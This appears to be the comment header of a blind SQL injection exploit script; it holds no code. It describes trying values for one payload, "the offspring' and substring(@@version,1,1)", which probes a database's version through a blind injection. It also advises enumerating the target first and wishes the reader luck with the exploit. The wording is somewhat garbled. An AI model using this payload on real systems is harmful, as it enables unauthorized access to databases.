#blind.sqli.injection.exploiter

# it's small but you'll note that do an amazing tasks and exploitation for blind SQLi

# the main function of this exploit is try various value for the "the offspring’ and substring(@@version,1,1)" payload

#and exploit blind SQLi (Standard Query Language injection) , don't try it directly , firstly gather information and enumerate various protocols

# after that you can analyze the results and might find an exploitable vulnerability , good luck for your exploit
